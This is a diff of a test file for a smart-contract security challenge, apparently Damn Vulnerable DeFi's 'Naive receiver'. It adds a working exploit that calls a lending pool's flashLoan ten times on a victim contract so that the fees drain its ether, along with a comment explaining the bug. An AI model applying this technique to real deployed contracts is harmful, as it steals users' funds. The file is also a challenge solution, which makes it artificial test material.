@@ -29,8 +29,15 @@ describe('[Challenge] Naive receiver', function () {
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
+    /**
+     * Goal: Drain all eth from the user's contract.
+     * Bug: everyone can use the user's contract to execute flash loan. Make the user's contract pay the fee.
+     * Solution: It cost 1 eth for the fee every time we execute flash loan, so we make it execute 10 times.
+    */
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        for (let i = 0; i < 10; i++) {
+            await this.pool.flashLoan(this.receiver.address, 0);
+        }
     });
 
     after(async function () {
